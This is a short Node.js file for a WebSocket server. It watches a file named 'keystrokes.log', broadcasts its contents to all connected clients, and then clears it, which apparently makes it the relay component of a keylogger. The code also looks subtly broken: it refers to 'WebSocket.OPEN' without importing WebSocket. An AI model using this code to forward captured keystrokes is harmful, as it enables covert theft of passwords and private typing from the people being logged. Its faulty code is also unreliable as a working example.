import { WebSocketServer } from "ws";
import fs from "fs";
import path from "path";

const wss = new WebSocketServer({ port: 6699 }, () => {
  console.log("WebSocket server started on ws://localhost:6699");
});

let clients = [];
const logPath = path.join(process.cwd(), "keystrokes.log");

wss.on("connection", (ws) => {
  console.log("New WebSocket connection established.");
  clients.push(ws);

  ws.on("message", (message) => {
    console.log("Received message:", message);

    // Broadcast the message to all connected clients
    clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
  });

  ws.on("close", () => {
    console.log("WebSocket connection closed.");
    clients = clients.filter((client) => client !== ws);
  });

  ws.on("error", (error) => {
    console.error("WebSocket error:", error);
  });
});

fs.watch(logPath, (eventType) => {
  if (eventType === "change" && fs.existsSync(logPath)) {
    const fileContent = fs.readFileSync(logPath, "utf8");
    console.log("Broadcasting message to clients:", fileContent);
    clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(fileContent);
      }
    });
    fs.writeFileSync(logPath, "", "utf8"); // Clear the log file after sending
  }
});
